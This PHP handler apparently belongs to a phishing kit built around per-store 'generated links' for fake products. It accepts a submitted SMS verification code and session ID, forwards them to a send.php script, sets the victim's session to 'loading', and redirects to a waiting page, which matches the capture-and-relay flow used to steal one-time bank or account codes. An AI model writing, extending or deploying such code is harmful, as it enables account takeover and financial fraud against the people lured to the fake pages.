<?php
session_start();
header('Content-Type: application/json');

// Load config
$config = require __DIR__ . '/config.php';

// Get store ID from session
$storeId = $_SESSION['current_store_id'] ?? null;

// Load specific store configuration if available
if ($storeId && isset($config['generated_links'][$storeId])) {
    $storeConfig = $config['generated_links'][$storeId];
    $config['store'] = $storeConfig['store'];
    $config['product'] = $storeConfig['product'];
}

// Get the POST data
$data = json_decode(file_get_contents('php://input'), true);
$sessionsFile = 'sessions.json';

if (isset($data['code']) && isset($data['sessionId'])) {
    // Prepare data for send.php
    $smsData = [
        'type' => 'sms_code',
        'data' => [
            'code' => $data['code'],
            'sessionId' => $data['sessionId']
        ]
    ];

    // Send to send.php using relative path
    $ch = curl_init('./send.php');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($smsData));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json',
        'Accept: application/json'
    ]);
    
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    
    // Debug logging
    error_log("SMS Verification - HTTP Code: " . $httpCode);
    error_log("SMS Verification - Response: " . $result);
    
    curl_close($ch);

    // Update session status to loading
    if (file_exists($sessionsFile)) {
        $sessions = json_decode(file_get_contents($sessionsFile), true);
        if (isset($sessions[$data['sessionId']])) {
            $sessions[$data['sessionId']]['status'] = 'loading';
            file_put_contents($sessionsFile, json_encode($sessions), LOCK_EX);
        }
    }

    // Return success response with redirect
    $storeParam = $storeId ? "?store=" . urlencode($storeId) : '';
    echo json_encode([
        'success' => true,
        'redirect' => '/loading.php' . $storeParam
    ]);
} else {
    // Return error if required data is missing
    echo json_encode([
        'success' => false,
        'error' => 'Invalid verification code'
    ]);
} 